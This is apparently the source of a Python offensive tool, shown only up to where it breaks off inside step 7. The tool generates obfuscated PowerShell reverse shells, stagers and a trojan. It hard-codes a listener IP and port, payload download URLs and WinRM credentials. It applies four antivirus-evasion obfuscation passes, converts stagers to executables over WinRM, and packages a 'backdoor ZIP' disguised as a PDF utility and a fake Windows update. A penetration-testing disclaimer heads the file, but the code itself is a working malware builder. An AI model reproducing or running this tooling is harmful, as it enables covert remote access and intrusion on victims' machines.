#!/usr/bin/env python3
"""
reverseParty.py - Reverse Shell Generation and Obfuscation Tool
================================================================
This script automates the creation of obfuscated reverse shells and stagers
for authorized penetration testing and red team operations.

DISCLAIMER: This tool is intended for authorized security testing only.
Unauthorized use against systems you do not own or have explicit permission
to test is illegal and unethical.

Directory structure expected:
  reverseParty/
  ├── reverseParty.py         (this script)
  └── engine/
      ├── powershell-cmd/
      │   ├── powershell-cmd.txt              (all PowerShell commands)
      │   └── powershell-cmd-noParametri.txt  (PS commands without params)
      ├── second-stage/        (clear-text reverse shell files)
      ├── stager/              (clear-text stager files)
      ├── out/                 (output - gets cleared each run)
      ├── stuff/               (support files: LAUNCHERNAME, TROJANNAME etc.)
      └── listener/            (listener scripts)

Dependencies:
    pip install pywinrm
"""

import os
import sys
import re
import uuid
import random
import shutil
import base64
import zipfile
import subprocess
from pathlib import Path


# Optional WinRM dependency - imported lazily in step 4 / step 7
try:
    import winrm
    WINRM_AVAILABLE = True
except ImportError:
    WINRM_AVAILABLE = False


# ==============================================================================
# VARIABLES — EDIT THESE BEFORE RUNNING THE SCRIPT
# ==============================================================================
# IP and port on which the listener is listening
LHOST        = "151.67.18.144"
LPORT        = "9001"
# Host from which you download second.TXT, stager.TXT
ATTACKER_URL = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
# Host from which you download trojan.ISO
# TROJAN_URL   = "http://151.61.206.201"
TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
# File name
SECONDNAME   = "second.txt"
STAGERNAME   = "stager.txt"
LAUNCHERNAME = "launcher.bat"
EXENAME      = "'ps2pdf'.exe"
ZIPNAME      = "postscript.zip"
ISONAME      = "setup.iso"
TROJAN_FE    = "update_k897867.msu"
ICONNAME     = "sicurezza.ico"
TROJANNAME   = "installer.ps1"
# IP, User and Pass to connect to in order to perform the ISO to EXE conversion operation
WIN_IP       = "192.168.1.111"
WIN_USER     = "ieuser"
WIN_PASS     = "Passw0rd!"


# ==============================================================================
# END OF USER-CONFIGURABLE VARIABLES
# ==============================================================================


# --- ANSI color codes for terminal output ---
RED_DARK   = "\033[31m"
YELLOW     = "\033[33m"
GREEN      = "\033[32m"
GREEN_DARK = "\033[32m"
RESET      = "\033[0m"

# --- Path definitions (relative to the script location) ---
SCRIPT_DIR       = os.path.dirname(os.path.abspath(__file__))
ENGINE_DIR       = os.path.join(SCRIPT_DIR, "engine")
OUT_DIR          = os.path.join(ENGINE_DIR, "out")
SECOND_STAGE_DIR = os.path.join(ENGINE_DIR, "second-stage")
STAGER_DIR       = os.path.join(ENGINE_DIR, "stager")
STUFF_DIR        = os.path.join(ENGINE_DIR, "stuff")
LISTENER_DIR     = os.path.join(ENGINE_DIR, "listener")
PS_CMD_DIR       = os.path.join(ENGINE_DIR, "powershell-cmd")
PS_CMD_FILE      = os.path.join(PS_CMD_DIR, "powershell-cmd.txt")
PS_CMD_NOPARAM   = os.path.join(PS_CMD_DIR, "powershell-cmd-noParametri.txt")


# ==============================================================================
# UTILITY FUNCTIONS
# ==============================================================================

def banner():
    print("=" * 70)
    print("  reverseParty.py — Reverse Shell Obfuscation Tool")
    print("  For authorized penetration testing use only.")
    print("=" * 70)
    print()

def section(title: str):
    print()
    print("─" * 70)
    print(f"  {title}")
    print("─" * 70)

def info(msg: str):
    print(f"  [*] {msg}")

def ok(msg: str):
    print(f"  {GREEN}[+]{RESET} {msg}")

def warn(msg: str):
    print(f"  {YELLOW}[!]{RESET} {msg}")

def err(msg: str):
    print(f"  {RED_DARK}[ERROR] {msg}{RESET}")
    sys.exit(1)

def err_nonfatal(msg: str):
    print(f"  {RED_DARK}[ERROR] {msg}{RESET}")

def generate_hex_pool(count: int = 80) -> list:
    pool = []
    seen = set()
    while len(pool) < count:
        h = uuid.uuid4().hex
        if h not in seen:
            seen.add(h)
            pool.append(h)
    return pool

def read_file(path: str) -> str:
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        return f.read()

def write_file(path: str, content: str):
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)


# ==============================================================================
# OBFUSCATION — PASS 1: Variable renaming
# ==============================================================================

def obfuscate_variables(content: str, hex_pool: list, used_hex: set) -> tuple:
    """
    Identifies PowerShell user-defined variables via the pattern $name=
    (i.e. assignment operator immediately follows the name, with optional
    whitespace).  Environment / automatic variables are NOT touched because
    they either never appear in assignment form or are filtered by context.

    Rules enforced:
      - Token must start with '$'
      - Token must end with '=' (assignment context)
      - The bare name must not already be a hex string (idempotent)
      - Each original name gets one unique UUID-hex replacement; the same hex
        token is NEVER reused for a different variable.
    """
    pattern = re.compile(r'\$([A-Za-z_][A-Za-z0-9_]*)\s*=')
    var_names = set(pattern.findall(content))

    mapping = {}
    for var_name in sorted(var_names):
        available = [h for h in hex_pool if h not in used_hex]
        if not available:
            for h in generate_hex_pool(80):
                if h not in used_hex:
                    available.append(h)
        chosen = available[0]
        used_hex.add(chosen)
        mapping[var_name] = chosen

    for var_name, hex_name in mapping.items():
        content = re.sub(
            r'\$' + re.escape(var_name) + r'(?=[^A-Za-z0-9_]|$)',
            '$' + hex_name,
            content
        )

    return content, mapping


# ==============================================================================
# OBFUSCATION — PASS 2: PowerShell command quote injection (Method 1)
# ==============================================================================

def _insert_junk_between_chars(word: str) -> str:
    """
    Method 1 — Quote injection.
    Inserts '' between letters of a PowerShell keyword so that the shell
    still executes the command while confusing signature scanners.

    Constraints:
      - At most ONE separator is placed between any two adjacent characters
        (prevents generating who''''ami).
      - Between 1 and (len-1) positions are selected at random.

    BUG FIX — only '' (single-quote pairs), never "" (double-quote pairs):
    If "" were injected inside a keyword (e.g. St""art-Process), Pass 3 would
    later misinterpret those double quotes as string delimiters and corrupt the
    token into something like St""("art-P""roc")...  Using only '' avoids this
    entirely because Pass 3 exclusively scans for double-quote delimited strings.
    """
    if len(word) <= 1:
        return word

    # FIX: single-quote pairs only — never double-quote pairs.
    separators = ["''"]
    chars = list(word)
    max_insertions = len(chars) - 1
    n_insertions = random.randint(1, max_insertions)

    gap_indices = list(range(max_insertions))
    insert_positions = set(random.sample(gap_indices, n_insertions))

    result = [chars[0]]
    for i in range(len(chars) - 1):
        if i in insert_positions:
            result.append(random.choice(separators))
        result.append(chars[i + 1])

    return "".join(result)


def obfuscate_ps_commands(content: str, ps_cmd_file: str) -> str:
    """
    Pass 2 — applies Method 1 (quote injection) to every PowerShell keyword
    found in ps_cmd_file that also appears in content.

    Processing order: longest keyword first (prevents partial replacements
    when one keyword is a prefix of another).

    Skipped tokens:
      - Commands starting with '.' (dot-source operator)
      - Commands starting with ':' (label)
      - Commands starting with '(' (expression grouping)

    BUG FIX — closure capture:
    The inner 'replacer' function is defined with a default-argument capture
    (_cmd=cmd) to prevent the classic Python late-binding closure bug where
    all loop iterations share the last value of 'cmd'.  Although 'cmd' is not
    currently used inside the function body (match.group(0) is used instead),
    the explicit capture guards against future refactoring regressions.
    """
    if not os.path.isfile(ps_cmd_file):
        warn(f"PS command list not found: {ps_cmd_file} — skipping pass 2.")
        return content

    raw = read_file(ps_cmd_file).splitlines()
    commands = [c.strip() for c in raw if c.strip()]
    commands.sort(key=len, reverse=True)

    for cmd in commands:
        if cmd.startswith('.') or cmd.startswith(':') or cmd.startswith('('):
            continue

        pattern = re.compile(
            r'(?<![.\:\(\$A-Za-z0-9_])' + re.escape(cmd) + r'(?![A-Za-z0-9_])',
            re.IGNORECASE
        )

        # FIX: default-argument capture to avoid late-binding closure bug
        def replacer(match, _cmd=cmd):
            return _insert_junk_between_chars(match.group(0))

        content = pattern.sub(replacer, content)

    return content


# ==============================================================================
# OBFUSCATION — PASS 3 (Trojan only): String concatenation split
# ==============================================================================

def obfuscate_string_concat(content: str) -> str:
    """
    Pass 3 — String concatenation split (applied to Trojan only).

    Splits double-quoted string literals by inserting a '+' concatenation
    operator at a random position:
        "malicious payload"  →  ("malicious "+"payload")

    This breaks naive string-literal matching by AV engines without altering
    runtime behaviour.

    BUG FIXES (3 issues vs original implementation):

    1. CORRUPTION CAUSED BY PASS-2 REMNANTS
       Root cause: Pass 2 originally injected "" (double-quote pairs) inside
       keywords, creating spurious " characters.  For example, after Pass 2
       the token Start-Process could become St""art-Process.  Pass 3's regex
       r'"([^"\r\n]{5,})"' would then find "art-Process" between those quotes
       and corrupt it into ("art-P"+"rocess"), producing the observed output
       St""("art-P""roc")...
       Fix: Pass 2 now uses ONLY '' (see _insert_junk_between_chars).  This
       pass also adds the pure-letter filter below as a second line of defence.

    2. TECHNICAL STRINGS INCORRECTLY SPLIT
       The original regex accepted any 5+ char content, corrupting:
         - IP addresses:    "151.61.206.201" → ("151.61.20"+"6.201")
         - HTTP headers:    "User-Agent"     → ("User-A"+"gent")
         - File names:      "wusa.exe"       → ("wusa.e"+"xe")
         - Format strings:  "HH:mm:ss"       → ("HH:mm"+"ss")
         - .NET namespaces, paths, URLs, etc.
       Fix: only split strings whose content consists exclusively of ASCII
       letters (a-z, A-Z) and spaces.  Any other character causes a skip.

    3. MISSING '+' OPERATOR IN OUTPUT
       The original code produced ("left""right") — two adjacent quoted strings
       with no operator — which is a PS syntax error.
       Fix: always emit the explicit '+' operator: ("left"+"right").
    """
    def split_string(m):
        s = m.group(1)

        # Minimum usable length (2 chars on each side of the cut)
        if len(s) <= 6:
            return m.group(0)

        # FIX: accept ONLY pure-letter (+ optional space) content.
        # Rejects IPs, URLs, file names, HTTP headers, .NET namespaces,
        # format strings, paths, and anything else with non-alpha characters.
        if re.search(r'[^A-Za-z ]', s):
            return m.group(0)

        # Ensure stripped content is still long enough
        if len(s.strip()) <= 6:
            return m.group(0)

        # Random split with 2-char minimum margin on each side
        cut = random.randint(2, len(s) - 2)
        left  = s[:cut]
        right = s[cut:]
        # FIX: explicit '+' operator between the two halves
        return f'("{left}"' + f'+"{right}")'

    pattern = re.compile(r'"([^"\r\n]{5,})"')
    return pattern.sub(split_string, content)


# ==============================================================================
# OBFUSCATION — PASS 4 (Trojan only): Random case mangling of keywords
# ==============================================================================

def obfuscate_case_mangle(content: str, ps_cmd_file: str) -> str:
    """
    Pass 4 — Case mangling (applied to Trojan only).

    PowerShell is case-insensitive, so randomly alternating the case of each
    character in a keyword defeats case-sensitive pattern matching.

    Example:
        New-Object  →  nEw-oBjEcT

    Keywords starting with '.', ':' or '(' are skipped (same rule as Pass 2).
    """
    if not os.path.isfile(ps_cmd_file):
        warn(f"PS command list not found: {ps_cmd_file} — skipping case mangle pass.")
        return content

    raw      = read_file(ps_cmd_file).splitlines()
    commands = [c.strip() for c in raw if c.strip()]
    commands.sort(key=len, reverse=True)

    def random_case(word: str) -> str:
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in word
        )

    for cmd in commands:
        if cmd.startswith('.') or cmd.startswith(':') or cmd.startswith('('):
            continue
        pattern = re.compile(
            r'(?<![.\:\(\$A-Za-z0-9_])' + re.escape(cmd) + r'(?![A-Za-z0-9_])',
            re.IGNORECASE
        )
        content = pattern.sub(lambda m: random_case(m.group(0)), content)

    return content


# ==============================================================================
# OBFUSCATION PIPELINE (shared by steps 2 & 3)
# ==============================================================================

def full_obfuscation_pipeline(content: str, label: str) -> str:
    hex_pool = generate_hex_pool(120)
    used_hex = set()

    info(f"  [{label}] Pass 1: Renaming user-defined variables with UUID hex tokens...")
    content, var_map = obfuscate_variables(content, hex_pool, used_hex)
    if var_map:
        ok(f"  [{label}] Renamed {len(var_map)} variable(s):")
        for orig, new in var_map.items():
            print(f"             ${orig}  →  ${new}")
    else:
        info(f"  [{label}] No assignable user-defined variables found.")

    info(f"  [{label}] Pass 2: Obfuscating PS command tokens (Method 1 — '' injection)...")
    before = content
    content = obfuscate_ps_commands(content, PS_CMD_FILE)
    if content != before:
        ok(f"  [{label}] PS command tokens obfuscated with '' insertions.")
    else:
        info(f"  [{label}] No matching PS command tokens found for quote injection.")

    return content


# ==============================================================================
# OBFUSCATION PIPELINE — EXTENDED (used by step 6 for Trojan)
# ==============================================================================

def full_obfuscation_pipeline_extended(content: str, label: str) -> str:
    """
    Extended 4-pass obfuscation pipeline applied exclusively to the
    Trojan (TROJANNAME).

    Pass 1 — Variable renaming (UUID hex tokens)
    Pass 2 — PS command '' injection (single-quote pairs only)
    Pass 3 — String literal split (pure-letter strings only, explicit '+')
    Pass 4 — Random case mangling of remaining PS keywords
    """
    hex_pool = generate_hex_pool(120)
    used_hex = set()

    # --- Pass 1: Variable renaming ---
    info(f"  [{label}] Pass 1: Renaming user-defined variables with UUID hex tokens...")
    content, var_map = obfuscate_variables(content, hex_pool, used_hex)
    if var_map:
        ok(f"  [{label}] Renamed {len(var_map)} variable(s):")
        for orig, new in var_map.items():
            print(f"             ${orig}  →  ${new}")
    else:
        info(f"  [{label}] No assignable user-defined variables found.")

    # --- Pass 2: Quote injection ('' only) ---
    info(f"  [{label}] Pass 2: Obfuscating PS command tokens (Method 1 — '' injection)...")
    before = content
    content = obfuscate_ps_commands(content, PS_CMD_FILE)
    if content != before:
        ok(f"  [{label}] PS command tokens obfuscated with '' insertions.")
    else:
        info(f"  [{label}] No matching PS command tokens found for quote injection.")

    # --- Pass 3: String concatenation split (pure-letter strings only) ---
    info(f"  [{label}] Pass 3: String literal split (pure-letter strings only)...")
    before = content
    content = obfuscate_string_concat(content)
    if content != before:
        ok(f"  [{label}] String literals split with '+' concatenation operator.")
    else:
        info(f"  [{label}] No eligible pure-letter string literals found.")

    # --- Pass 4: Random case mangling ---
    info(f"  [{label}] Pass 4: Random case mangling of remaining PS keywords...")
    before = content
    content = obfuscate_case_mangle(content, PS_CMD_FILE)
    if content != before:
        ok(f"  [{label}] PS keywords case-mangled (random upper/lower per character).")
    else:
        info(f"  [{label}] No remaining plaintext PS keywords found for case mangling.")

    return content


# ==============================================================================
# STEP 1 — VARIABLE VALIDATION
# ==============================================================================

def step1_validate_variables():
    section("STEP 1 — Variable Validation")
    info("Checking that all required configuration variables are set...")
    info("The following values will be used during this run:")
    print()

    variables = {
        "LHOST":        LHOST,
        "LPORT":        LPORT,
        "ATTACKER_URL": ATTACKER_URL,
        "SECONDNAME":   SECONDNAME,
        "STAGERNAME":   STAGERNAME,
        "LAUNCHERNAME": LAUNCHERNAME,
        "EXENAME":      EXENAME,
        "ZIPNAME":      ZIPNAME,
        "ISONAME":      ISONAME,
        "WIN_IP":       WIN_IP,
        "WIN_USER":     WIN_USER,
        "WIN_PASS":     WIN_PASS,
        "TROJAN_FE":    TROJAN_FE,
        "ICONNAME":     ICONNAME,
        "TROJANNAME":   TROJANNAME,
        "TROJAN_URL":   TROJAN_URL,
    }

    all_ok = True
    max_len = max(len(k) for k in variables)

    for var_name, var_value in variables.items():
        padded = var_name.ljust(max_len)
        if not var_value or var_value.strip() == "":
            print(f"    {RED_DARK}{padded} = [NOT SET]  ← MISSING!{RESET}")
            all_ok = False
        else:
            print(f"    {padded} = {var_value}")

    print()
    if not all_ok:
        err("One or more required variables are not set. "
            "Please edit the variables section at the top of the script.")

    ok("All variables are set. Proceeding to Step 2...")


# ==============================================================================
# STEP 2 — SECOND STAGE OBFUSCATION
# ==============================================================================

def step2_obfuscate_second_stage():
    section("STEP 2 — Second Stage Obfuscation")

    info("Clearing output directory: " + OUT_DIR)
    if os.path.isdir(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR, exist_ok=True)
    ok("Output directory cleared and recreated successfully.")

    info("Scanning second-stage directory: " + SECOND_STAGE_DIR)
    if not os.path.isdir(SECOND_STAGE_DIR):
        err(f"Second-stage directory not found: {SECOND_STAGE_DIR}")

    stage_files = [
        f for f in os.listdir(SECOND_STAGE_DIR)
        if os.path.isfile(os.path.join(SECOND_STAGE_DIR, f))
    ]
    if not stage_files:
        err(f"No files found in second-stage directory: {SECOND_STAGE_DIR}")

    selected = random.choice(stage_files)
    selected_path = os.path.join(SECOND_STAGE_DIR, selected)
    ok(f"Randomly selected second-stage file: {selected}")

    dest_path = os.path.join(OUT_DIR, SECONDNAME)
    shutil.copy2(selected_path, dest_path)
    ok(f"Copied to output directory as: {dest_path}")

    info("Substituting placeholders [ATTACKER-IP] and [ATTACKER-PORT]...")
    content = read_file(dest_path)
    n_ip   = content.count("[ATTACKER-IP]")
    n_port = content.count("[ATTACKER-PORT]")
    content = content.replace("[ATTACKER-IP]",   LHOST)
    content = content.replace("[ATTACKER-PORT]", LPORT)
    write_file(dest_path, content)
    ok(f"Replaced {n_ip} occurrence(s) of [ATTACKER-IP]   → '{LHOST}'.")
    ok(f"Replaced {n_port} occurrence(s) of [ATTACKER-PORT] → '{LPORT}'.")

    info("Starting obfuscation pipeline (2 passes) on second-stage file...")
    content = read_file(dest_path)
    content = full_obfuscation_pipeline(content, label="second-stage")
    write_file(dest_path, content)
    ok(f"Second-stage obfuscation complete. Output: {dest_path}")


# ==============================================================================
# STEP 3 — STAGER OBFUSCATION
# ==============================================================================

def step3_obfuscate_stager():
    section("STEP 3 — Stager Obfuscation")

    info("Scanning stager directory: " + STAGER_DIR)
    if not os.path.isdir(STAGER_DIR):
        err(f"Stager directory not found: {STAGER_DIR}")

    stager_files = [
        f for f in os.listdir(STAGER_DIR)
        if os.path.isfile(os.path.join(STAGER_DIR, f))
    ]
    if not stager_files:
        err(f"No files found in stager directory: {STAGER_DIR}")

    selected = random.choice(stager_files)
    selected_path = os.path.join(STAGER_DIR, selected)
    ok(f"Randomly selected stager file: {selected}")

    dest_path = os.path.join(OUT_DIR, STAGERNAME)
    shutil.copy2(selected_path, dest_path)
    ok(f"Copied to output directory as: {dest_path}")

    info("Substituting placeholders [ATTACKER-URL] and [SECONDNAME]...")
    content = read_file(dest_path)
    n_url = content.count("[ATTACKER-URL]")
    n_sec = content.count("[SECONDNAME]")
    content = content.replace("[ATTACKER-URL]", ATTACKER_URL)
    content = content.replace("[SECONDNAME]",   SECONDNAME)
    write_file(dest_path, content)
    ok(f"Replaced {n_url} occurrence(s) of [ATTACKER-URL] → '{ATTACKER_URL}'.")
    ok(f"Replaced {n_sec} occurrence(s) of [SECONDNAME]   → '{SECONDNAME}'.")

    info("Starting obfuscation pipeline (2 passes) on stager file...")
    content = read_file(dest_path)
    content = full_obfuscation_pipeline(content, label="stager")
    write_file(dest_path, content)
    ok(f"Stager obfuscation complete. Output: {dest_path}")


# ==============================================================================
# STEP 4 — STAGER PS1 → EXE CONVERSION VIA WINRM
# ==============================================================================

def step4_convert_stager_to_exe():
    section("STEP 4 — Stager PS1 → EXE Conversion via WinRM")

    stager_local = os.path.join(OUT_DIR, STAGERNAME)
    exe_local    = os.path.join(OUT_DIR, EXENAME)

    if not WINRM_AVAILABLE:
        err_nonfatal(
            "The 'pywinrm' library is not installed. "
            "Run: pip install pywinrm\n"
            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    info(f"Connecting to Windows machine at {WIN_IP} via WinRM (user: {WIN_USER})...")
    try:
        session = winrm.Session(
            f"http://{WIN_IP}:5985/wsman",
            auth=(WIN_USER, WIN_PASS),
            transport="ntlm",
            read_timeout_sec=30,
            operation_timeout_sec=25,
        )
        result = session.run_ps("$env:COMPUTERNAME")
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        hostname = result.std_out.decode(errors="replace").strip()
        ok(f"Connected to Windows machine: {hostname} ({WIN_IP})")
    except Exception as e:
        err_nonfatal(
            f"Could not connect to {WIN_IP} via WinRM: {e}\n"
            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    # CHUNK_SIZE = 500 (safe WinRM per-command payload size).
    # WinRM/WSMan has an internal per-command payload limit much smaller than
    # the Windows CLI limit (8191 chars): passing the b64 string inline inside
    # Set-Content / Add-Content causes "La riga di comando è troppo lunga"
    # even with 4000-char chunks.  500 chars fits inside every known WinRM limit.
    # Each chunk is wrapped in a PS here-string (@'...'@) to avoid quoting issues
    # with the base64 alphabet (+, /, =).
    info(f"Uploading {STAGERNAME} to Windows %TEMP% directory (chunked transfer)...")
    try:
        with open(stager_local, "rb") as f:
            file_bytes = f.read()
        b64_full  = base64.b64encode(file_bytes).decode("ascii")

        CHUNK_SIZE = 500
        chunks     = [b64_full[i:i + CHUNK_SIZE]
                      for i in range(0, len(b64_full), CHUNK_SIZE)]
        remote_b64 = f"$env:TEMP\\{STAGERNAME}.b64"
        remote_dst = f"$env:TEMP\\{STAGERNAME}"

        info(f"  File size: {len(file_bytes):,} bytes  →  "
             f"{len(chunks)} chunk(s) of up to {CHUNK_SIZE} b64 chars each.")

        init_ps = (
            f"$chunk = @'\n{chunks[0]}\n'@\n"
            f"Set-Content -Path \"{remote_b64}\" -Value $chunk.Trim() -Encoding ASCII\n"
            f"Write-Output 'Chunk 1 OK'"
        )
        result = session.run_ps(init_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))

        for idx, chunk in enumerate(chunks[1:], start=2):
            append_ps = (
                f"$chunk = @'\n{chunk}\n'@\n"
                f"Add-Content -Path \"{remote_b64}\" -Value $chunk.Trim() -Encoding ASCII\n"
                f"Write-Output 'Chunk {idx} OK'"
            )
            result = session.run_ps(append_ps)
            if result.status_code != 0:
                raise RuntimeError(result.std_err.decode(errors="replace"))

        _bt_r = "`r"
        _bt_n = "`n"
        decode_ps = (
            f'$b64 = (Get-Content -Path "{remote_b64}" -Raw)'
            f' -replace "{_bt_r}",\'\' -replace "{_bt_n}",\'\';\n'
            f'$bytes = [System.Convert]::FromBase64String($b64);\n'
            f'[System.IO.File]::WriteAllBytes("{remote_dst}", $bytes);\n'
            f'Remove-Item "{remote_b64}" -Force -EA 0;\n'
            f"Write-Output 'Decode OK'"
        )
        result = session.run_ps(decode_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))

        ok(f"File {STAGERNAME} uploaded to remote %TEMP% successfully "
           f"({len(chunks)} chunk(s) × {CHUNK_SIZE} b64 chars).")
    except Exception as e:
        err_nonfatal(
            f"Failed to upload {STAGERNAME} to {WIN_IP}: {e}\n"
            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        return

    info(f"Running Invoke-ps2exe: {STAGERNAME} → {EXENAME}...")
    try:
        convert_ps = (
            f"Invoke-ps2exe \"$env:TEMP\\{STAGERNAME}\" \"$env:TEMP\\{EXENAME}\";\n"
            f"if (Test-Path \"$env:TEMP\\{EXENAME}\") "
            f"{{ Write-Output 'Conversion OK' }} "
            f"else {{ Write-Error 'EXE not created' }}"
        )
        result = session.run_ps(convert_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        ok(f"Invoke-ps2exe completed. Remote EXE: %TEMP%\\{EXENAME}")
    except Exception as e:
        err_nonfatal(
            f"ps2exe conversion failed on {WIN_IP}: {e}\n"
            f"  {RED_DARK}Ensure ps2exe is installed on the Windows machine "
            f"(Install-Module ps2exe).\n"
            f"  The stager EXE ({EXENAME}) will NOT be generated. "
            f"Continuing...{RESET}"
        )
        session.run_ps(f"Remove-Item \"$env:TEMP\\{STAGERNAME}\" -Force -EA 0")
        return

    info(f"Downloading {EXENAME} from Windows %TEMP% to local out/...")
    try:
        download_ps = (
            f"$bytes = [System.IO.File]::ReadAllBytes(\"$env:TEMP\\{EXENAME}\");\n"
            f"[System.Convert]::ToBase64String($bytes)"
        )
        result = session.run_ps(download_ps)
        if result.status_code != 0:
            raise RuntimeError(result.std_err.decode(errors="replace"))
        b64_exe   = result.std_out.decode(errors="replace").strip()
        exe_bytes = base64.b64decode(b64_exe)
        with open(exe_local, "wb") as f:
            f.write(exe_bytes)
        ok(f"EXE downloaded: {exe_local} ({len(exe_bytes):,} bytes)")
    except Exception as e:
        err_nonfatal(
            f"Failed to download {EXENAME} from {WIN_IP}: {e}\n"
            f"  {RED_DARK}The stager EXE will NOT be available locally. "
            f"Continuing...{RESET}"
        )

    info("Cleaning up temporary files from Windows %TEMP%...")
    try:
        cleanup_ps = (
            f"Remove-Item \"$env:TEMP\\{STAGERNAME}\" -Force -EA 0;\n"
            f"Remove-Item \"$env:TEMP\\{EXENAME}\" -Force -EA 0;\n"
            f"Write-Output 'Cleanup OK'"
        )
        session.run_ps(cleanup_ps)
        ok("Remote temporary files cleaned up.")
    except Exception:
        warn("Could not clean up temporary files on the Windows machine.")


# ==============================================================================
# STEP 5 — ZIP CREATION (LAUNCHER + STAGER EXE)
# ==============================================================================

def step5_create_zip():
    """
    STEP 5: Create the backdoor ZIP archive containing the launcher and stager EXE.

    Actions performed:
      5a. Verify that the stager EXE (EXENAME) exists in out/.
      5b. Verify that the launcher file (LAUNCHERNAME) exists in stuff/.
      5c. Create ZIPNAME inside out/ with EXENAME and LAUNCHERNAME at archive root.
      5d. Print deployment reminders.
    """
    section("STEP 5 — ZIP Creation (Launcher + Stager EXE)")

    exe_local      = os.path.join(OUT_DIR, EXENAME)
    launcher_local = os.path.join(STUFF_DIR, LAUNCHERNAME)
    zip_local      = os.path.join(OUT_DIR, ZIPNAME)

    if not os.path.isfile(exe_local):
        err_nonfatal(
            f"Stager EXE not found: {exe_local}\n"
            f"  {RED_DARK}Ensure Step 4 completed successfully. "
            f"ZIP will NOT be created. Continuing...{RESET}"
        )
        return

    if not os.path.isfile(launcher_local):
        err_nonfatal(
            f"Launcher file not found: {launcher_local}\n"
            f"  {RED_DARK}Ensure '{LAUNCHERNAME}' exists inside the stuff/ directory. "
            f"ZIP will NOT be created. Continuing...{RESET}"
        )
        return

    info(f"Creating ZIP archive: {zip_local}")
    info(f"  Adding: {EXENAME}       (from out/)")
    info(f"  Adding: {LAUNCHERNAME}  (from stuff/)")
    try:
        with zipfile.ZipFile(zip_local, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.write(exe_local,      arcname=EXENAME)
            zf.write(launcher_local, arcname=LAUNCHERNAME)
        zip_size = os.path.getsize(zip_local)
        ok(f"ZIP archive created successfully: {zip_local} ({zip_size:,} bytes)")
    except Exception as e:
        err_nonfatal(
            f"Failed to create ZIP archive: {e}\n"
            f"  {RED_DARK}ZIP will NOT be available. Continuing...{RESET}"
        )
        return

    print()
    print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
    print(f"  {GREEN_DARK}  DEPLOYMENT REMINDERS:{RESET}")
    print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
    print(f"  {GREEN_DARK}  ** Copy {SECONDNAME} on {ATTACKER_URL}{RESET}")
    print(f"  {GREEN_DARK}     and activate a web server to download it {RESET}")
    print(f"  {GREEN_DARK}  ** Copy {ZIPNAME} on {ATTACKER_URL}{RESET}")
    print(f"  {GREEN_DARK}     and activate a web server to download it{RESET}")
    print(f"  {GREEN_DARK}  ** Activates the correct listener (TCP, TLS etc) depending on the selected second stage {RESET}")
    print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
    print()


# ==============================================================================
# STEP 6 — Trojan OBFUSCATION
# ==============================================================================

def step6_obfuscate_trojan():
    """
    STEP 6: Obfuscate the Trojan (TROJANNAME).

    Actions performed:
      6a. Copy TROJAN_FE and TROJANNAME from stuff/ to out/.
      6b. Substitute placeholders: [TROJAN-URL], [TROJAN_FE], [STAGERNAME].
      6c. Apply the extended 4-pass obfuscation pipeline on TROJANNAME.
    """
    section("STEP 6 — Trojan Obfuscation")

    trojan_fe_src  = os.path.join(STUFF_DIR, TROJAN_FE)
    trojan_fe_dest = os.path.join(OUT_DIR,   TROJAN_FE)
    if not os.path.isfile(trojan_fe_src):
        err(
            f"Trojan source file not found: {trojan_fe_src}\n"
            f"Ensure '{TROJAN_FE}' exists inside the stuff/ directory."
        )
    info(f"Copying '{TROJAN_FE}' from stuff/ to out/ ...")
    shutil.copy2(trojan_fe_src, trojan_fe_dest)
    ok(f"Copied: {trojan_fe_src}  →  {trojan_fe_dest}")

    trojan_src  = os.path.join(STUFF_DIR, TROJANNAME)
    trojan_dest = os.path.join(OUT_DIR,   TROJANNAME)
    if not os.path.isfile(trojan_src):
        err(
            f"Trojan source file not found: {trojan_src}\n"
            f"Ensure '{TROJANNAME}' exists inside the stuff/ directory."
        )
    info(f"Copying '{TROJANNAME}' from stuff/ to out/ ...")
    shutil.copy2(trojan_src, trojan_dest)
    ok(f"Copied: {trojan_src}  →  {trojan_dest}")

    info("Substituting placeholders [TROJAN-URL], [TROJAN_FE] and [STAGERNAME]...")
    content = read_file(trojan_dest)

    n_url    = content.count("[TROJAN-URL]")
    n_fe     = content.count("[TROJAN_FE]")
    n_stager = content.count("[STAGERNAME]")

    content = content.replace("[TROJAN-URL]", TROJAN_URL)
    content = content.replace("[TROJAN_FE]",  TROJAN_FE)
    content = content.replace("[STAGERNAME]", STAGERNAME)

    write_file(trojan_dest, content)
    ok(f"Replaced {n_url} occurrence(s) of [TROJAN-URL]  → '{TROJAN_URL}'.")
    ok(f"Replaced {n_fe} occurrence(s) of [TROJAN_FE]   → '{TROJAN_FE}'.")
    ok(f"Replaced {n_stager} occurrence(s) of [STAGERNAME] → '{STAGERNAME}'.")

    info("Starting EXTENDED obfuscation pipeline (4 passes) on Trojan...")
    content = read_file(trojan_dest)
    content = full_obfuscation_pipeline_extended(content, label="trojan")
    write_file(trojan_dest, content)

    ok(f"Trojan obfuscation complete. Output: {trojan_dest}")


# ==============================================================================
# STEP 7 — Trojan PS1 → EXE CONVERSION VIA WINRM
# ==============================================================================

def step7_convert_trojan_to_exe():
    """
    STEP 7: Convert the obfuscated Trojan PS1 to a Windows EXE via WinRM.

    Actions performed:
      7a. Check pywinrm availability; if missing → non-fatal error, skip step.
      7b. Establish WinRM session (NTLM). On failure → non-fatal error, skip.
